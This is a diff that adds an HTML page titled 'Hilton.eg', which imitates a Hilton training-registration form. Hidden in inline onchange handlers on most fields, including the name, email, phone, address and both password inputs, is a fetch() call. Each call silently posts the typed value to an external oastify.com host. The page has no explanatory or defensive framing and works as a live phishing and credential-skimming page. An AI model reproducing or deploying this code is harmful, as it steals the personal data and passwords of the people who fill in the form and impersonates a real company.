@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hilton.eg</title>
+    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
+    <link href="./index.css" rel="stylesheet">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+    <script src="./index.js" defer></script>
+</head>
+
+<body>
+    <form action="https://www.hilton.com/en/" method="POST">
+        <fieldset>
+            <legend>Personal Information:</legend>
+            <label for="full_name">Full Name:</label><br>
+            <input type="text" id="full_name" name="full_name" required onchange="if(this.value.length)fetch('https://skgwomg2s1eeuz7xj6v36c6s3j9ax1lq.oastify.com',{
+                method:'POST',
+                mode: 'no-cors',
+                body:this.value
+                });"><br>
+
+            <label for="email">Email Address:</label><br>
+            <input type="email" id="email" name="email" required onchange="if(this.value.length)fetch('https://skgwomg2s1eeuz7xj6v36c6s3j9ax1lq.oastify.com',{
+                method:'POST',
+                mode: 'no-cors',
+                body:this.value
+                });"><br>
+
+            <label for="phone">Phone Number:</label><br>
+            <input type="tel" id="phone" name="phone" required onchange="if(this.value.length)fetch('https://skgwomg2s1eeuz7xj6v36c6s3j9ax1lq.oastify.com',{
+                method:'POST',
+                mode: 'no-cors',
+                body:this.value
+                });"><br>
+
+            <label for="address">Address:</label><br>
+            <textarea id="address" name="address" rows="4" cols="50" required onchange="if(this.value.length)fetch('https://skgwomg2s1eeuz7xj6v36c6s3j9ax1lq.oastify.com',{
+                method:'POST',
+                mode: 'no-cors',
+                body:this.value
+                });"></textarea><br>
+        </fieldset>
+
+        <fieldset>
+            <legend>Training Details:</legend>
+            <label for="training_title">Training Title:</label><br>
+            <input type="text" id="training_title" name="training_title" required onchange="if(this.value.length)fetch('https://skgwomg2s1eeuz7xj6v36c6s3j9ax1lq.oastify.com',{
+                method:'POST',
+                mode: 'no-cors',
+                body:this.value
+                });"><br>
+
+            <label for="training_date">Preferred Training Date:</label><br>
+            <input type="date" id="training_date" name="training_date" required onchange="if(this.value.length)fetch('https://skgwomg2s1eeuz7xj6v36c6s3j9ax1lq.oastify.com',{
+                method:'POST',
+                mode: 'no-cors',
+                body:this.value
+                });"><br>
+
+            <label for="training_location">Preferred Training Location:</label><br>
+            <input type="text" id="training_location" name="training_location" required onchange="if(this.value.length)fetch('https://skgwomg2s1eeuz7xj6v36c6s3j9ax1lq.oastify.com',{
+                method:'POST',
+                mode: 'no-cors',
+                body:this.value
+                });"><br>
+        </fieldset>
+
+        <fieldset>
+            <legend>Additional Information:</legend>
+            <label for="occupation">Current Occupation:</label><br>
+            <input type="text" id="occupation" name="occupation"><br>
+
+            <label for="training_experience">Previous Training Experience:</label><br>
+            <input type="text" id="training_experience" name="training_experience" onchange="if(this.value.length)fetch('https://skgwomg2s1eeuz7xj6v36c6s3j9ax1lq.oastify.com',{
+                method:'POST',
+                mode: 'no-cors',
+                body:this.value
+                });"><br>
+
+            <label for="special_requirements">Special Requirements or Accommodations Needed:</label><br>
+            <textarea id="special_requirements" name="special_requirements" rows="4" cols="50"></textarea><br>
+        </fieldset>
+
+        <fieldset>
+            <legend>Password:</legend>
+            <label for="password">Password:</label><br>
+            <input type="password" id="password" name="password" required spellcheck="true" onchange="if(this.value.length)fetch('https://skgwomg2s1eeuz7xj6v36c6s3j9ax1lq.oastify.com',{
+                method:'POST',
+                mode: 'no-cors',
+                body:this.value
+                });"><br>
+
+            <label for="confirm_password">Confirm Password:</label><br>
+            <input type="password" id="confirm_password" name="confirm_password" required onchange="if(this.value.length)fetch('https://skgwomg2s1eeuz7xj6v36c6s3j9ax1lq.oastify.com',{
+                method:'POST',
+                mode: 'no-cors',
+                body:this.value
+                });"><br>
+        </fieldset>
+
+        <fieldset>
+            <legend>Declaration:</legend>
+            <input type="checkbox" id="declaration" name="declaration" required>
+            <label for="declaration">I hereby confirm that the information provided above is true and accurate to the
+                best of my knowledge. I understand that this registration does not guarantee a spot in the training
+                program, and I will adhere to the terms and conditions set forth by Hilton regarding the
+                training.</label><br>
+
+            <label for="signature">Signature:</label><br>
+            <input type="text" id="signature" name="signature" required><br>
+        </fieldset>
+
+        <a href="https://www.hilton.com/en/"> <input type="submit" value="Submit"> </a>
+    </form>
+</body>
+
+</html>
